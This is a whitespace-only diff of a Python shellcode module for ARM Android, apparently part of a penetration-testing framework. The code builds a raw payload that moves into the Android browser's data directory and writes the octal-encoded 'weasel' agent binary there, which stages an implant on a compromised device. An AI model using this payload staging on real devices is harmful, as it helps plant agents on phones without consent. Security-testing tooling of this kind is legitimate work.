@@ -45,7 +45,7 @@ class ARMEABI(Module, common.ShellCode):
 
     def generate(self, arguments):
         self.format = "R"   # we only support RAW format
-        
+
         architecture = "armeabi"
         if arguments.working_directory != None:
             directory = arguments.working_directory
@@ -54,7 +54,7 @@ class ARMEABI(Module, common.ShellCode):
         else:
             directory = "/data/data/com.android.browser"
         weasel = Configuration.library(os.path.join("weasel", architecture, "w"))
-        
+
         self.append(self.hexifyString("cd %s\n" % directory))
         self.append(self.hexifyString("/system/bin/rm w\n"))
         self.append(self.hexifyString("echo -e \"%s\" > w\n" % "".join(map(lambda b: "\\0%.3o" % ord(b), fs.read(weasel)))))
